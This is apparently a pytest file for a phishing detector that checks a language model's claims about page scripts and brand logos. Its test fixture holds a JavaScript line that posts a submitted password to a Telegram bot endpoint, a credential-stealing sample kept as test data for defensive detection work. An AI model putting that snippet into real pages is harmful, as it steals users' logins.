"""AI1 P4 and P3: the script and visual brains against a fake model. An endpoint claim counts only
if the passage is in the page's code and the host is one the browser or the code extraction saw; a
brand seen in a picture counts only for a listed brand, off its domain, on a credential page, with
high confidence; the vision model gets the sandbox's re-encoded copy only; a slow model keeps what
was already checked."""

import asyncio
import json
from typing import Any

import pytest

from core.brain import script as script_brain
from core.brain import visual as visual_brain
from core.brain.run import Brain
from core.detection.engine import analyze_url
from core.detonate.judge import judge
from core.detonate.models import PageReport

PW = {"type": "password", "hint": "password"}
EMAIL = {"type": "email", "hint": "email"}
CODE = (
    'document.querySelector("form").onsubmit = function(e) {\n'
    'fetch("https://api.telegram.org/bot123:abc/sendMessage", '
    '{method: "POST", body: pass.value});\n'
    "};"
)


def page(url: str = "https://secure-check.example/login", **kw: Any) -> PageReport:
    base: dict[str, Any] = {
        "status": "ok", "final_url": url, "http_status": 200, "title": "Account", "text": "Sign in",
        "forms": [{"action": url, "method": "post", "fields": [EMAIL, PW]}], "code": CODE,
        "hosts": ["secure-check.example", "api.telegram.org"], "screenshot": "UkFX",
    }  # fmt: skip
    return PageReport.model_validate({**base, **kw})


STEP = {"action": "sends_to_chat_bot", "endpoint": "api.telegram.org",
        "quote": 'fetch("https://api.telegram.org/bot123:abc/sendMessage"'}  # fmt: skip


def script(**kw: Any) -> script_brain.ScriptAnswer:
    return script_brain.ScriptAnswer.model_validate({"steps": [STEP], "confidence": 80} | kw)


def visual(**kw: Any) -> visual_brain.VisualAnswer:
    base = {"brand": "Microsoft", "looks_like": "sign_in", "confidence": 90}
    return visual_brain.VisualAnswer.model_validate(base | kw)


# ---- the script brain --------------------------------------------------------------------------


def test_code_that_sends_typed_data_to_a_seen_chat_bot_is_found() -> None:
    found = script_brain.findings(script(), page(), "secure-check.example", set())
    assert [r for r, _ in found] == ["brain.page_script_exfiltration"]
    assert "api.telegram.org" in found[0][1]


@pytest.mark.parametrize(
    ("step", "why"),
    [
        ({**STEP, "quote": "sendToBot(creds)"}, "a passage that is not in the code"),
        ({**STEP, "endpoint": "collector.example.net"}, "a host nobody saw"),
        ({**STEP, "endpoint": "secure-check.example"}, "the page's own site"),
        ({**STEP, "action": "redirects_visitor"}, "not a sending action"),
    ],
)
def test_an_unchecked_script_claim_does_not_count(step: dict[str, str], why: str) -> None:
    answer = script_brain.ScriptAnswer.model_validate({"steps": [step], "confidence": 90})
    assert script_brain.findings(answer, page(), "secure-check.example", set()) == [], why


def test_a_rule_that_already_caught_the_endpoint_is_not_repeated() -> None:
    fired = {"page.collection_endpoint"}
    assert script_brain.findings(script(), page(), "secure-check.example", fired) == []


def test_no_credential_ask_means_no_script_finding() -> None:
    assert script_brain.findings(script(), page(forms=[]), "secure-check.example", set()) == []


# ---- the visual brain --------------------------------------------------------------------------


def test_a_listed_brand_seen_off_its_domain_on_a_credential_page_is_found() -> None:
    found = visual_brain.findings(visual(), page(), "secure-check.example", set())
    assert [r for r, _ in found] == ["brain.page_visual_brand"] and "Microsoft" in found[0][1]


@pytest.mark.parametrize(
    ("answer", "domain", "fired"),
    [
        ({"confidence": 50}, "secure-check.example", set()),  # not sure enough
        ({"brand": "Acme Credit Union"}, "secure-check.example", set()),  # not on the lists
        ({}, "microsoft.com", set()),  # the brand's own domain
        ({}, "secure-check.example", {"page.brand_credential"}),  # the rules already said it
        ({"brand": ""}, "secure-check.example", set()),
    ],
)
def test_a_visual_claim_that_cannot_be_checked_does_not_count(
    answer: dict[str, Any], domain: str, fired: set[str]
) -> None:
    assert visual_brain.findings(visual(**answer), page(), domain, fired) == []


# ---- the three questions together ---------------------------------------------------------------


class ByQuestion:
    """A fake model that answers each question with the form it was asked for."""

    model = "fake"

    def __init__(self, answers: dict[str, Any], slow: str | None = None) -> None:
        self.answers, self.slow, self.images = answers, slow, []

    async def generate(
        self, system: str, prompt: str, schema: dict[str, Any], images: Any = None
    ) -> str:
        kind = schema.get("title", "")
        if images:
            self.images.append(images)
        if kind == self.slow:
            await asyncio.sleep(5)
        return json.dumps(self.answers.get(kind, {}))


ANSWERS = {
    "PageAnswer": {
        "brand": "",
        "brand_quotes": [],
        "asks_for": ["password"],
        "purpose": "sign_in",
        "pressure": [],
        "confidence": 40,
    },  # fmt: skip
    "ScriptAnswer": {"steps": [STEP], "confidence": 80},
    "VisualAnswer": {"brand": "Microsoft", "looks_like": "sign_in", "confidence": 90},
}


def run_page(model: ByQuestion, monkeypatch: pytest.MonkeyPatch, timeout: float = 5) -> Any:
    seen: list[str | None] = []

    def reencoded(raw: str | None) -> str | None:
        seen.append(raw)
        return "SANDBOX-COPY"

    monkeypatch.setattr("core.detonate.safe_screenshot", reencoded)
    r = page()
    start = analyze_url(r.final_url)
    out = asyncio.run(Brain(model, timeout).page(start, r, judge(start, r)))
    return out, seen


def test_all_three_questions_add_their_checked_findings(monkeypatch: pytest.MonkeyPatch) -> None:
    model = ByQuestion(ANSWERS)
    out, seen = run_page(model, monkeypatch)
    rules = {s.rule_id for s in out.verdict.signals}
    assert {"brain.page_script_exfiltration", "brain.page_visual_brand"} <= rules
    assert seen == ["UkFX"] and model.images == [["SANDBOX-COPY"]]  # only the re-encoded copy


def test_a_slow_last_question_keeps_what_was_already_checked(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    out, _ = run_page(ByQuestion(ANSWERS, slow="VisualAnswer"), monkeypatch, timeout=1.0)
    rules = {s.rule_id for s in out.verdict.signals}
    assert "brain.page_script_exfiltration" in rules and "brain.page_visual_brand" not in rules
